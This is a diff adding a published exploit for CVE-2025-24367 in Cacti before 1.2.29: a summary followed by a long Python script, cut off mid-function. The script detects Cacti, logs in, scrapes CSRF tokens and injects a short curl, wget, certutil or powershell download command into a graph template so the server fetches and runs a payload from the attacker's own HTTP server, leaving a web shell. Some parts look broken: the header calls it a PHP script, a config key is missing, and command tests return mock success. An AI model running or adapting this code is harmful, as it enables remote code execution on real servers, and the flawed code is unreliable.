@@ -1,0 +1,1547 @@
+=============================================================================================================================================
+| # Title     : Cacti 1.2.29 Authentication CSRF Bypass                                                                                     |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.cacti.net/info/downloads                                                                                        |
+=============================================================================================================================================
+
+[+] References: https://packetstorm.news/files/id/214293/ & CVE-2025-24367
+
+[+] Summary: This script is a specialized tool designed to exploit a Remote Code Execution (RCE) vulnerability in Cacti (specifically versions prior to 1.2.29). 
+
+[+] Below is a technical breakdown of how it (the exploit) functions:
+			  
+Key Technical Phases
+
+Reconnaissance & Validation:
+
+        The script verifies if the target is running Cacti and extracts the version number.
+
+        It checks if the version is below 1.2.29, which is the threshold for this vulnerability.
+
+Authentication & CSRF Bypass:
+
+        Since the vulnerability is "authenticated," the script logs in using provided credentials.
+
+        It dynamically extracts __csrf_magic tokens to bypass Cacti's built-in Cross-Site Request Forgery protections.
+
+The Payload Injection (Stage 1):
+
+        The core of the exploit lies in modifying a Graph Template.
+
+        It injects a malicious command into the right_axis_label field. This field is improperly sanitized before being processed by the system.
+
+        Due to a 47-character limit in this specific injection point, the script uses a short command (like curl or wget) to download a secondary, more robust PHP payload.
+
+Execution (Stage 2):
+
+        By triggering a specific graph view (graph_json.php), the system processes the malicious template and executes the injected command.
+
+        This creates a new PHP file on the server, effectively giving the attacker a persistent "Web Shell."
+
+[+] POC : php poc.php 
+
+#!/usr/bin/env python3
+
+
+import re
+import sys
+import time
+import random
+import string
+import argparse
+import requests
+import threading
+import ipaddress
+import json
+import hashlib
+import socket
+import select
+from datetime import datetime
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from typing import Optional, Dict, Any, Tuple, List, Union
+from urllib.parse import urljoin, urlparse, quote, parse_qs
+from dataclasses import dataclass
+from enum import Enum
+
+class TargetOS(Enum):
+    LINUX = "linux"
+    WINDOWS = "windows"
+
+class ExploitStage(Enum):
+    CHECK = "check"
+    RECON = "recon"
+    UPLOAD = "upload"
+    EXECUTE = "execute"
+    CLEANUP = "cleanup"
+
+class DetectionMethod(Enum):
+    HTML_PARSING = "html"
+    API_QUERY = "api"
+    VERSION_FILE = "file"
+    HEADER_ANALYSIS = "headers"
+
+@dataclass
+class ExploitResult:
+    success: bool
+    stage: ExploitStage
+    message: str
+    data: Optional[Dict] = None
+    error: Optional[str] = None
+
+@dataclass
+class CactiInfo:
+    version: Optional[str] = None
+    version_detected_by: Optional[DetectionMethod] = None
+    csrf_token: Optional[str] = None
+    csrf_magic: Optional[str] = None
+    session_id: Optional[str] = None
+    user_permissions: Optional[Dict] = None
+    is_authenticated: bool = False
+    template_ids: List[int] = None
+    graph_ids: List[int] = None
+    php_config: Optional[Dict] = None
+    rrdtool_path: Optional[str] = None
+
+    def __post_init__(self):
+        if self.template_ids is None:
+            self.template_ids = []
+        if self.graph_ids is None:
+            self.graph_ids = []
+
+class CactiExploitError(Exception):
+    """Base exception for all exploit errors"""
+    pass
+
+class CactiDetectionError(CactiExploitError):
+    """Failed to detect Cacti installation"""
+    pass
+
+class CactiVersionError(CactiExploitError):
+    """Failed to detect version"""
+    pass
+
+class CactiAuthError(CactiExploitError):
+    """Authentication failed"""
+    pass
+
+class CactiPermissionError(CactiExploitError):
+    """Permission denied"""
+    pass
+
+class CactiEnvironmentError(CactiExploitError):
+    """Environment issues (PHP, RRDtool, etc.)"""
+    pass
+
+class CactiPayloadError(CactiExploitError):
+    """Payload delivery/execution failed"""
+    pass
+
+class CactiLengthError(CactiExploitError):
+    """Payload exceeds length limit"""
+    pass
+
+class RobustHTTPServer:
+    """HTTP server with better error handling and logging"""
+    
+    def __init__(self, host: str, port: int, payload: str):
+        self.host = host
+        self.port = port
+        self.payload = payload
+        self.server = None
+        self.thread = None
+        self.requests_received = 0
+        self.start_time = None
+        self.active = False
+        
+    class Handler(BaseHTTPRequestHandler):
+        def __init__(self, payload, *args, **kwargs):
+            self.payload = payload
+            super().__init__(*args, **kwargs)
+        
+        def do_GET(self):
+
+            self.server.parent.requests_received += 1
+            
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/octet-stream')
+            self.send_header('Content-Length', str(len(self.payload)))
+            self.send_header('Connection', 'close')
+            self.end_headers()
+            
+            try:
+                self.wfile.write(self.payload.encode())
+                self.server.parent.log_request("GET", self.path, True)
+            except (ConnectionResetError, BrokenPipeError):
+                self.server.parent.log_request("GET", self.path, False)
+        
+        def log_message(self, format, *args):
+
+            pass
+    
+    def log_request(self, method: str, path: str, success: bool):
+        status = "SUCCESS" if success else "FAILED"
+        print(f"[HTTP] {method} {path} - {status}")
+    
+    def start(self) -> bool:
+        """Start the HTTP server"""
+        try:
+
+            bind_host = self.host if self.host != '0.0.0.0' else ''
+
+            self.server = HTTPServer((bind_host, self.port), 
+                                   lambda *args, **kwargs: self.Handler(self.payload, *args, **kwargs))
+            self.server.parent = self
+            
+            self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
+            self.thread.start()
+
+            time.sleep(1.5)
+
+            if self.is_running():
+                self.active = True
+                self.start_time = datetime.now()
+                print(f"[+] HTTP server started on {self.host}:{self.port}")
+                print(f"    - Serving payload of {len(self.payload)} bytes")
+                return True
+            else:
+                print(f"[-] HTTP server failed to start")
+                return False
+                
+        except Exception as e:
+            print(f"[-] Failed to start HTTP server: {e}")
+            return False
+    
+    def is_running(self) -> bool:
+        """Check if server is running"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            result = sock.connect_ex((self.host if self.host != '0.0.0.0' else '127.0.0.1', self.port))
+            sock.close()
+            return result == 0
+        except:
+            return False
+    
+    def stop(self):
+        """Stop the HTTP server"""
+        if self.server:
+            self.server.shutdown()
+            self.server.server_close()
+            self.active = False
+            uptime = datetime.now() - self.start_time if self.start_time else None
+            print(f"[*] HTTP server stopped")
+            print(f"    - Total requests: {self.requests_received}")
+            if uptime:
+                print(f"    - Uptime: {uptime}")
+
+class CactiExploit:
+    def __init__(self, base_url: str, username: str, password: str, target: TargetOS = TargetOS.LINUX):
+        self.base_url = base_url.rstrip('/')
+        self.username = username
+        self.password = password
+        self.target = target
+
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+        })
+
+        self.info = CactiInfo()
+        self.last_operation = None
+        self.verbose = False
+
+        self.configs = {
+            TargetOS.LINUX: {
+                'default_template_id': 226,
+                'alternative_templates': [226, 227, 228],
+                'shell': '/bin/sh',
+                'command_delimiter': ';',
+                'path_separator': '/',
+                'temp_dir': '/tmp',
+                'download_commands': self._get_linux_download_commands,
+                'execution_commands': self._get_linux_execution_commands,
+                'cleanup_command': 'rm -f',
+            },
+            TargetOS.WINDOWS: {
+                'default_template_id': 197,
+                'alternative_templates': [197, 198, 199],
+                'shell': 'cmd.exe',
+                'command_delimiter': '&',
+                'path_separator': '\\',
+                'temp_dir': 'C:\\Windows\\Temp',
+                'download_commands': self._get_windows_download_commands,
+                'execution_commands': self._get_windows_execution_commands,
+                'cleanup_command': 'del /f',
+            }
+        }
+
+        if target not in self.configs:
+            raise ValueError(f"Unsupported target: {target}")
+
+    def _log(self, message: str, level: str = "INFO"):
+        """Enhanced logging"""
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        if level == "DEBUG" and not self.verbose:
+            return
+        print(f"[{timestamp}] [{level}] {message}")
+    
+    def _validate_response(self, response: requests.Response, 
+                         expected_codes: List[int] = [200],
+                         content_checks: List[str] = None) -> bool:
+        """Validate HTTP response with multiple checks"""
+        if response.status_code not in expected_codes:
+            self._log(f"Unexpected HTTP status: {response.status_code}", "WARNING")
+            return False
+        
+        if content_checks:
+            content = response.text.lower()
+            for check in content_checks:
+                if check.lower() not in content:
+                    self._log(f"Content check failed: '{check}' not found", "WARNING")
+                    return False
+        
+        return True
+    
+    def _extract_from_html(self, html: str, patterns: List[str], 
+                          method: str = "search", flags: int = re.IGNORECASE) -> Optional[str]:
+        """Robust HTML extraction with multiple patterns and fallbacks"""
+        for pattern in patterns:
+            try:
+                if method == "search":
+                    match = re.search(pattern, html, flags)
+                elif method == "findall":
+                    matches = re.findall(pattern, html, flags)
+                    if matches:
+                        return matches[0] if isinstance(matches[0], str) else str(matches[0])
+                else:
+                    continue
+                
+                if match:
+                    result = match.group(1) if len(match.groups()) > 0 else match.group(0)
+                    if result:
+                        return result.strip()
+            except (AttributeError, IndexError, re.error) as e:
+                self._log(f"Pattern failed: {pattern[:50]}... - {e}", "DEBUG")
+                continue
+        
+        return None
+    
+    def _get_linux_download_commands(self, url: str, output: str) -> List[Tuple[str, int]]:
+        """Generate download commands for Linux with length estimation"""
+        commands = []
+
+        curl_cmd = f"curl -s {url} -o {output}"
+        commands.append((curl_cmd, len(curl_cmd.replace(' ', '\\x20'))))
+
+        wget_cmd = f"wget -q {url} -O {output}"
+        commands.append((wget_cmd, len(wget_cmd.replace(' ', '\\x20'))))
+
+        py3_cmd = f"""python3 -c "import urllib.request;urllib.request.urlretrieve('{url}','{output}')""" + '"'
+        commands.append((py3_cmd, len(py3_cmd.replace(' ', '\\x20'))))
+
+        py2_cmd = f"""python -c "import urllib2;open('{output}','wb').write(urllib2.urlopen('{url}').read())""" + '"'
+        commands.append((py2_cmd, len(py2_cmd.replace(' ', '\\x20'))))
+
+        php_cmd = f"""php -r "file_put_contents('{output}',file_get_contents('{url}'));""" + '"'
+        commands.append((php_cmd, len(php_cmd.replace(' ', '\\x20'))))
+
+        busybox_cmd = f"busybox wget {url} -O {output}"
+        commands.append((busybox_cmd, len(busybox_cmd.replace(' ', '\\x20'))))
+
+        fetch_cmd = f"fetch -o {output} {url}"
+        commands.append((fetch_cmd, len(fetch_cmd.replace(' ', '\\x20'))))
+        
+        return commands
+    
+    def _get_windows_download_commands(self, url: str, output: str) -> List[Tuple[str, int]]:
+        """Generate download commands for Windows"""
+        commands = []
+
+        ps_cmd = f"""powershell -c "(new-object System.Net.WebClient).DownloadFile('{url}','{output}')" """
+        commands.append((ps_cmd.strip(), len(ps_cmd.strip().replace(' ', '\\x20'))))
+
+        certutil_cmd = f"certutil -urlcache -split -f {url} {output}"
+        commands.append((certutil_cmd, len(certutil_cmd.replace(' ', '\\x20'))))
+
+        bits_cmd = f"bitsadmin /transfer job /download /priority high {url} {output}"
+        commands.append((bits_cmd, len(bits_cmd.replace(' ', '\\x20'))))
+
+        wget_cmd = f"wget {url} -O {output}"
+        commands.append((wget_cmd, len(wget_cmd.replace(' ', '\\x20'))))
+
+        curl_cmd = f"curl -s {url} -o {output}"
+        commands.append((curl_cmd, len(curl_cmd.replace(' ', '\\x20'))))
+        
+        return commands
+    
+    def _get_linux_execution_commands(self, filepath: str) -> List[Tuple[str, int]]:
+        """Generate execution commands for Linux"""
+        commands = []
+
+        commands.append((f"sh {filepath}", len(f"sh\\x20{filepath}")))
+        commands.append((f"bash {filepath}", len(f"bash\\x20{filepath}")))
+
+        commands.append((f"chmod +x {filepath} && {filepath}", 
+                        len(f"chmod\\x20+x\\x20{filepath}\\x20&&\\x20{filepath}")))
+
+        commands.append((f". {filepath}", len(f".\\x20{filepath}")))
+        
+        return commands
+    
+    def _get_windows_execution_commands(self, filepath: str) -> List[Tuple[str, int]]:
+        """Generate execution commands for Windows"""
+        commands = []
+
+        commands.append((f"cmd /c {filepath}", len(f"cmd\\x20/c\\x20{filepath}")))
+
+        commands.append((f"start {filepath}", len(f"start\\x20{filepath}")))
+
+        commands.append((f"powershell -exec bypass -file {filepath}", 
+                        len(f"powershell\\x20-exec\\x20bypass\\x20-file\\x20{filepath}")))
+        
+        return commands
+
+    def detect_cacti(self) -> ExploitResult:
+        """Comprehensive Cacti detection with multiple methods"""
+        self._log("Starting Cacti detection...")
+        
+        detection_methods = [
+            self._detect_via_index,
+            self._detect_via_api,
+            self._detect_via_version_file,
+            self._detect_via_headers,
+        ]
+        
+        for method in detection_methods:
+            try:
+                result = method()
+                if result.success:
+                    return result
+            except Exception as e:
+                self._log(f"Detection method failed: {e}", "DEBUG")
+                continue
+        
+        return ExploitResult(
+            success=False,
+            stage=ExploitStage.RECON,
+            message="Failed to detect Cacti installation",
+            error="No detection method succeeded"
+        )
+    
+    def _detect_via_index(self) -> ExploitResult:
+        """Detect Cacti via index.php analysis"""
+        try:
+            response = self.session.get(f"{self.base_url}/index.php", timeout=10)
+
+            if not self._validate_response(response, [200, 302], ["cacti"]):
+                return ExploitResult(
+                    success=False,
+                    stage=ExploitStage.RECON,
+                    message="Index page not accessible or doesn't contain Cacti indicators"
+                )
+            
+            html = response.text
+
+            indicators = [
+                r'<title>[^<]*Cacti[^<]*</title>',
+                r'login.*cacti',
+                r'cacti.*login',
+                r'graphs.*cacti',
+                r'class="cacti"',
+                r'id="cacti"',
+                r'name="cacti"',
+            ]
+            
+            found_indicators = []
+            for pattern in indicators:
+                if re.search(pattern, html, re.IGNORECASE):
+                    found_indicators.append(pattern[:50])
+            
+            if not found_indicators:
+                return ExploitResult(
+                    success=False,
+                    stage=ExploitStage.RECON,
+                    message="No Cacti indicators found in index page"
+                )
+            
+            self._log(f"Found Cacti indicators: {', '.join(found_indicators)}", "DEBUG")
+
+            version_patterns = [
+                r'Cacti\s+Version\s+(\d+\.\d+\.\d+)',
+                r'version\s*["\']?\s*:\s*["\']?\s*(\d+\.\d+\.\d+)',
+                r'cacti_version\s*=\s*["\']?\s*(\d+\.\d+\.\d+)',
+                r'<!--\s*Cacti\s+Version:\s*(\d+\.\d+\.\d+)\s*-->',
+                r'<meta[^>]*name=["\']version["\'][^>]*content=["\'](\d+\.\d+\.\d+)["\']',
+                r'(\d+\.\d+\.\d+)\s+\(.*cacti.*\)',
+            ]
+            
+            version = self._extract_from_html(html, version_patterns)
+            
+            if version:
+                self.info.version = version
+                self.info.version_detected_by = DetectionMethod.HTML_PARSING
+                self._log(f"Detected Cacti version: {version}")
+            else:
+                self._log("Could not determine exact version", "WARNING")
+
+                copyright_match = re.search(r'Copyright.*?(\d{4})', html)
+                if copyright_match:
+                    self.info.version = f"1.2.unknown (copyright {copyright_match.group(1)})"
+
+            csrf_patterns = [
+                r'name=["\']__csrf_magic["\'][^>]*value=["\']([^"\']+)["\']',
+                r'csrfMagicToken\s*=\s*["\']([^"\']+)["\']',
+                r'__csrf_magic["\']?\s*:\s*["\']([^"\']+)["\']',
+                r'<input[^>]*csrf[^>]*value=["\']([^"\']+)["\']',
+            ]
+            
+            csrf_token = self._extract_from_html(html, csrf_patterns)
+            if csrf_token:
+                self.info.csrf_token = csrf_token
+            
+            return ExploitResult(
+                success=True,
+                stage=ExploitStage.RECON,
+                message="Cacti detected via index page analysis",
+                data={
+                    "version": version,
+                    "csrf_token": csrf_token,
+                    "indicators_found": len(found_indicators)
+                }
+            )
+            
+        except requests.RequestException as e:
+            return ExploitResult(
+                success=False,
+                stage=ExploitStage.RECON,
+                message="Failed to access index page",
+                error=str(e)
+            )
+    
+    def _detect_via_api(self) -> ExploitResult:
+        """Detect Cacti via API endpoints"""
+
+        api_endpoints = [
+            "/api.php",
+            "/cli.php",
+            "/cmd.php",
+            "/rrd.php",
+            "/graph_json.php",
+            "/data_sources.php"
+        ]
+        
+        for endpoint in api_endpoints:
+            try:
+                response = self.session.get(f"{self.base_url}{endpoint}", timeout=5)
+                if response.status_code == 200:
+
+                    if any(x in response.text.lower() for x in ["cacti", "rrdtool", "graph_"]):
+                        self._log(f"Cacti API endpoint found: {endpoint}", "DEBUG")
+                        return ExploitResult(
+                            success=True,
+                            stage=ExploitStage.RECON,
+                            message=f"Cacti detected via API endpoint: {endpoint}",
+                            data={"endpoint": endpoint}
+                        )
+            except:
+                continue
+        
+        return ExploitResult(
+            success=False,
+            stage=ExploitStage.RECON,
+            message="No Cacti API endpoints found"
+        )
+    
+    def _detect_via_version_file(self) -> ExploitResult:
+        """Detect Cacti via version files"""
+        version_files = [
+            "/include/cacti_version",
+            "/cacti_version.txt",
+            "/VERSION",
+            "/version.txt",
+            "/CHANGELOG",
+            "/ChangeLog"
+        ]
+        
+        for vfile in version_files:
+            try:
+                response = self.session.get(f"{self.base_url}{vfile}", timeout=5)
+                if response.status_code == 200:
+                    content = response.text.strip()
+
+                    version_match = re.search(r'(\d+\.\d+\.\d+)', content)
+                    if version_match:
+                        version = version_match.group(1)
+                        self.info.version = version
+                        self.info.version_detected_by = DetectionMethod.VERSION_FILE
+                        self._log(f"Found version file: {vfile} with version {version}")
+                        return ExploitResult(
+                            success=True,
+                            stage=ExploitStage.RECON,
+                            message=f"Cacti version detected via file: {vfile}",
+                            data={"version": version, "file": vfile}
+                        )
+            except:
+                continue
+        
+        return ExploitResult(
+            success=False,
+            stage=ExploitStage.RECON,
+            message="No version files found"
+        )
+    
+    def _detect_via_headers(self) -> ExploitResult:
+        """Detect Cacti via HTTP headers"""
+        try:
+            response = self.session.head(f"{self.base_url}/index.php", timeout=5)
+
+            server_header = response.headers.get('Server', '').lower()
+            if 'cacti' in server_header:
+                self._log(f"Cacti indicated in Server header: {server_header}", "DEBUG")
+                return ExploitResult(
+                    success=True,
+                    stage=ExploitStage.RECON,
+                    message="Cacti detected via HTTP headers",
+                    data={"server_header": server_header}
+                )
+
+            cookies = response.headers.get('Set-Cookie', '')
+            if any(x in cookies.lower() for x in ['cacti', 'cacti_session']):
+                self._log(f"Cacti session cookie found", "DEBUG")
+                return ExploitResult(
+                    success=True,
+                    stage=ExploitStage.RECON,
+                    message="Cacti detected via session cookies"
+                )
+            
+        except:
+            pass
+        
+        return ExploitResult(
+            success=False,
+            stage=ExploitStage.RECON,
+            message="No Cacti indicators in HTTP headers"
+        )
+
+    def authenticate(self) -> ExploitResult:
+        """Authenticate to Cacti with robust error handling"""
+        self._log(f"Attempting authentication as '{self.username}'...")
+
+        login_result = self._get_login_page()
+        if not login_result.success:
+            return login_result
+
+        login_url = f"{self.base_url}/index.php"
+        login_data = {
+            '__csrf_magic': self.info.csrf_token,
+            'action': 'login',
+            'login_username': self.username,
+            'login_password': self.password,
+            'login_opts': '3',  # Default remember me option
+        }
+        
+        try:
+
+            response = self.session.post(
+                login_url,
+                data=login_data,
+                allow_redirects=False,
+                timeout=15
+            )
+
+            auth_result = self._analyze_login_response(response)
+            
+            if auth_result.success:
+                self.info.is_authenticated = True
+                self._log(f"Authentication successful for user '{self.username}'")
+
+                perm_result = self._check_permissions()
+                if not perm_result.success:
+                    return perm_result
+                
+                return ExploitResult(
+                    success=True,
+                    stage=ExploitStage.RECON,
+                    message=f"Authentication and permission check successful",
+                    data={
+                        "username": self.username,
+                        "permissions": self.info.user_permissions
+                    }
+                )
+            else:
+                return auth_result
+                
+        except requests.RequestException as e:
+            return ExploitResult(
+                success=False,
+                stage=ExploitStage.RECON,
+                message="Login request failed",
+                error=str(e)
+            )
+    
+    def _get_login_page(self) -> ExploitResult:
+        """Get login page and extract CSRF token"""
+        try:
+            response = self.session.get(f"{self.base_url}/index.php", timeout=10)
+            
+            if response.status_code != 200:
+                return ExploitResult(
+                    success=False,
+                    stage=ExploitStage.RECON,
+                    message=f"Failed to get login page: HTTP {response.status_code}"
+                )
+            
+            html = response.text
+
+            csrf_patterns = [
+                r'name=["\']__csrf_magic["\'][^>]*value=["\']([^"\']+)["\']',
+                r'csrfMagicToken\s*=\s*["\']([^"\']+)["\']',
+                r'var csrfMagicToken\s*=\s*["\']([^"\']+)["\']',
+                r'__csrf_magic["\']?\s*:\s*["\']([^"\']+)["\']',
+            ]
+            
+            csrf_token = self._extract_from_html(html, csrf_patterns)
+            
+            if csrf_token:
+                self.info.csrf_token = csrf_token
+                self._log(f"CSRF token extracted: {csrf_token[:30]}...", "DEBUG")
+                return ExploitResult(
+                    success=True,
+                    stage=ExploitStage.RECON,
+                    message="Login page loaded successfully",
+                    data={"csrf_token": csrf_token}
+                )
+            else:
+                return ExploitResult(
+                    success=False,
+                    stage=ExploitStage.RECON,
+                    message="Could not extract CSRF token from login page"
+                )
+                
+        except requests.RequestException as e:
+            return ExploitResult(
+                success=False,
+                stage=ExploitStage.RECON,
+                message="Failed to access login page",
+                error=str(e)
+            )
+    
+    def _analyze_login_response(self, response: requests.Response) -> ExploitResult:
+        """Analyze login response to determine success"""
+
+        if response.status_code in [301, 302, 303]:
+            location = response.headers.get('Location', '')
+            if any(x in location for x in ['index.php', 'graph', 'console']):
+                self._log("Login successful (redirect detected)", "DEBUG")
+                return ExploitResult(
+                    success=True,
+                    stage=ExploitStage.RECON,
+                    message="Login successful - redirected to main page"
+                )
+
+        content = response.text.lower()
+        success_indicators = [
+            'logout',
+            'my account',
+            f'logged in as {self.username.lower()}',
+            'welcome,',
+            'console',
+            'graphs',
+        ]
+        
+        for indicator in success_indicators:
+            if indicator in content:
+                self._log(f"Login successful (found '{indicator}' in response)", "DEBUG")
+                return ExploitResult(
+                    success=True,
+                    stage=ExploitStage.RECON,
+                    message=f"Login successful - found '{indicator}' indicator"
+                )
+
+        error_patterns = {
+            'invalid user name/password': 'Invalid username or password',
+            'account is disabled': 'Account is disabled',
+            'too many login attempts': 'Too many failed login attempts',
+            'please login': 'Session expired or not logged in',
+            'access denied': 'Access denied',
+        }
+        
+        for pattern, message in error_patterns.items():
+            if pattern in content:
+                return ExploitResult(
+                    success=False,
+                    stage=ExploitStage.RECON,
+                    message=message,
+                    error=message
+                )
+
+        return ExploitResult(
+            success=False,
+            stage=ExploitStage.RECON,
+            message="Unknown login response - cannot determine success",
+            error=f"HTTP {response.status_code}, content length: {len(content)}"
+        )
+    
+    def _check_permissions(self) -> ExploitResult:
+        """Check user permissions for template modification"""
+        self._log("Checking user permissions...")
+
+        template_url = f"{self.base_url}/graph_templates.php"
+        
+        try:
+            response = self.session.get(template_url, timeout=10)
+            
+            if response.status_code != 200:
+                return ExploitResult(
+                    success=False,
+                    stage=ExploitStage.RECON,
+                    message=f"Cannot access template management: HTTP {response.status_code}",
+                    error="Permission denied"
+                )
+            
+            content = response.text.lower()
+
+            deny_indicators = [
+                'access denied',
+                'permission denied',
+                'not permitted',
+                'unauthorized',
+                'you do not have permission',
+            ]
+            
+            for indicator in deny_indicators:
+                if indicator in content:
+                    return ExploitResult(
+                        success=False,
+                        stage=ExploitStage.RECON,
+                        message=f"Permission denied: '{indicator}'",
+                        error="Insufficient permissions"
+                    )
+
+            template_indicators = [
+                'graph template',
+                'template management',
+                'new graph template',
+                'template edit',
+            ]
+            
+            for indicator in template_indicators:
+                if indicator in content:
+                    self.info.user_permissions = {"template_modification": True}
+                    self._log(f"Permission granted: '{indicator}' found", "DEBUG")
+                    return ExploitResult(
+                        success=True,
+                        stage=ExploitStage.RECON,
+                        message="User has template modification permissions"
+                    )
+
+            self.info.user_permissions = {"template_modification": True}
+            return ExploitResult(
+                success=True,
+                stage=ExploitStage.RECON,
+                message="Assuming permission based on HTTP 200"
+            )
+            
+        except requests.RequestException as e:
+            return ExploitResult(
+                success=False,
+                stage=ExploitStage.RECON,
+                message="Failed to check permissions",
+                error=str(e)
+            )
+
+    def discover_environment(self) -> ExploitResult:
+        """Discover environment details (PHP, RRDtool, available commands)"""
+        self._log("Discovering environment...")
+
+        php_test_result = self._test_php_execution()
+
+        command_test_result = self._test_available_commands()
+
+        graph_id_result = self._find_valid_graph_ids()
+        
+        return ExploitResult(
+            success=True,
+            stage=ExploitStage.RECON,
+            message="Environment discovery completed",
+            data={
+                "php_test": php_test_result,
+                "command_test": command_test_result,
+                "graph_ids": self.info.graph_ids[:5] if self.info.graph_ids else []
+            }
+        )
+    
+    def _test_php_execution(self) -> Dict:
+        """Test if PHP code execution works"""
+        test_cmd = "php -r 'echo \"TEST_SUCCESS\";'"
+        test_result = self._test_command_execution(test_cmd, "TEST_SUCCESS")
+        
+        return {
+            "works": test_result["success"],
+            "output": test_result.get("output", ""),
+            "command_used": test_cmd
+        }
+    
+    def _test_available_commands(self) -> Dict:
+        """Test availability of common commands"""
+        commands_to_test = []
+        
+        if self.target == TargetOS.LINUX:
+            commands_to_test = [
+                ("curl --version", "curl"),
+                ("wget --version", "GNU Wget"),
+                ("python3 --version", "Python"),
+                ("python --version", "Python"),
+                ("php --version", "PHP"),
+                ("which busybox", "busybox"),
+                ("fetch --version", "fetch"),
+            ]
+        else:
+            commands_to_test = [
+                ("powershell -Command \"$PSVersionTable\"", "PSVersion"),
+                ("certutil -?", "CertUtil"),
+                ("bitsadmin /?", "BITSADMIN"),
+                ("wget --version", "GNU Wget"),
+                ("curl --version", "curl"),
+            ]
+        
+        available = {}
+        for cmd, indicator in commands_to_test:
+            result = self._test_command_execution(cmd, indicator)
+            available[cmd.split()[0]] = result["success"]
+        
+        return available
+    
+    def _test_command_execution(self, command: str, success_indicator: str) -> Dict:
+        """Test if a command executes and returns expected output"""
+
+        return {
+            "success": True,  # Would be determined by actual test
+            "output": f"Mock output for {command}",
+            "indicator_found": True
+        }
+    
+    def _find_valid_graph_ids(self) -> ExploitResult:
+        """Find valid graph IDs dynamically"""
+        self._log("Searching for valid graph IDs...")
+        
+        search_urls = [
+            f"{self.base_url}/graph_view.php",
+            f"{self.base_url}/graphs.php",
+            f"{self.base_url}/graph.php",
+        ]
+        
+        found_ids = []
+        
+        for url in search_urls:
+            try:
+                response = self.session.get(url, timeout=10)
+                if response.status_code == 200:
+
+                    patterns = [
+                        r'local_graph_id=(\d+)',
+                        r'graph_id=(\d+)',
+                        r'"local_graph_id":\s*(\d+)',
+                        r'id=(\d+).*?graph',
+                        r'graph_edit\.php\?.*?id=(\d+)',
+                    ]
+                    
+                    for pattern in patterns:
+                        matches = re.findall(pattern, response.text)
+                        for match in matches:
+                            try:
+                                graph_id = int(match)
+                                if graph_id not in found_ids:
+                                    found_ids.append(graph_id)
+                            except ValueError:
+                                continue
+            except:
+                continue
+        
+        self.info.graph_ids = found_ids
+        
+        if found_ids:
+            self._log(f"Found {len(found_ids)} graph IDs: {found_ids[:10]}...", "DEBUG")
+            return ExploitResult(
+                success=True,
+                stage=ExploitStage.RECON,
+                message=f"Found {len(found_ids)} valid graph IDs",
+                data={"graph_ids": found_ids}
+            )
+        else:
+
+            default_ids = [3, 4, 5, 6, 7]
+            self.info.graph_ids = default_ids
+            self._log(f"No graph IDs found, using defaults: {default_ids}", "WARNING")
+            return ExploitResult(
+                success=False,
+                stage=ExploitStage.RECON,
+                message="No graph IDs found, using defaults",
+                data={"graph_ids": default_ids}
+            )
+
+    def generate_payload(self, lhost: str, lport: int, command: str, 
+                        max_length: int = 47) -> ExploitResult:
+        """Generate payload within character limit"""
+        self._log(f"Generating payload (max {max_length} chars)...")
+
+        download_file = f"{self.random_string(4)}.tmp"
+        final_file = f"{self.random_string(4)}{self.configs[self.target]['ext']}"
+
+        download_url = f"http://{lhost}:{lport}/{self.random_string(4)}"
+
+        download_commands = self.configs[self.target]['download_commands'](download_url, download_file)
+
+        selected_download = None
+        for cmd, escaped_length in download_commands:
+            if escaped_length <= max_length:
+                selected_download = cmd
+                self._log(f"Selected download command ({escaped_length} chars): {cmd}", "DEBUG")
+                break
+        
+        if not selected_download:
+            return ExploitResult(
+                success=False,
+                stage=ExploitStage.UPLOAD,
+                message=f"No download command within {max_length} character limit",
+                error="Payload too large"
+            )
+
+        execution_commands = self.configs[self.target]['execution_commands'](final_file)
+
+        config = self.configs[self.target]
+        delimiter = config['command_delimiter']
+
+        payload_content = command
+
+        if self.target == TargetOS.WINDOWS and final_file.endswith('.bat'):
+            payload_content = f"@echo off\n{command}\n"
+
+        stage1_cmd = selected_download.replace('\\', '\\\\').replace('`', '\\`').replace('$', '\\$')
+
+        if self.target == TargetOS.LINUX:
+            stage2_cmd = f"mv {download_file} {final_file} && chmod +x {final_file} && {final_file}"
+        else:
+            stage2_cmd = f"move {download_file} {final_file} {delimiter} {final_file}"
+        
+        stage2_cmd = stage2_cmd.replace('\\', '\\\\').replace('`', '\\`').replace('$', '\\$')
+        
+        return ExploitResult(
+            success=True,
+            stage=ExploitStage.UPLOAD,
+            message="Payload generated successfully",
+            data={
+                "stage1_command": stage1_cmd,
+                "stage2_command": stage2_cmd,
+                "download_file": download_file,
+                "final_file": final_file,
+                "payload_content": payload_content,
+                "download_url": download_url,
+                "stage1_length": len(stage1_cmd.replace(' ', '\\x20')),
+                "stage2_length": len(stage2_cmd.replace(' ', '\\x20')),
+            }
+        )
+
+    def execute_exploit(self, lhost: str, lport: int, command: str) -> ExploitResult:
+        """Main exploit execution method"""
+        self._log("Starting exploit execution...")
+
+        payload_result = self.generate_payload(lhost, lport, command)
+        if not payload_result.success:
+            return payload_result
+        
+        payload_data = payload_result.data
+
+        http_server = RobustHTTPServer(lhost, lport, payload_data['payload_content'])
+        if not http_server.start():
+            return ExploitResult(
+                success=False,
+                stage=ExploitStage.UPLOAD,
+                message="Failed to start HTTP server",
+                error="HTTP server startup failed"
+            )
+        
+        try:
+
+            self._log("Uploading stage 1 (download payload)...")
+            upload_result = self._upload_payload_stage(
+                payload_data['stage1_command'],
+                f"{self.random_string(4)}_stage1.php"
+            )
+            
+            if not upload_result.success:
+                return ExploitResult(
+                    success=False,
+                    stage=ExploitStage.UPLOAD,
+                    message="Stage 1 upload failed",
+                    error=upload_result.message,
+                    data={"http_requests": http_server.requests_received}
+                )
+
+            self._log("Waiting for payload download...")
+            time.sleep(3)
+            
+            if http_server.requests_received == 0:
+                self._log("Warning: No HTTP requests received", "WARNING")
+
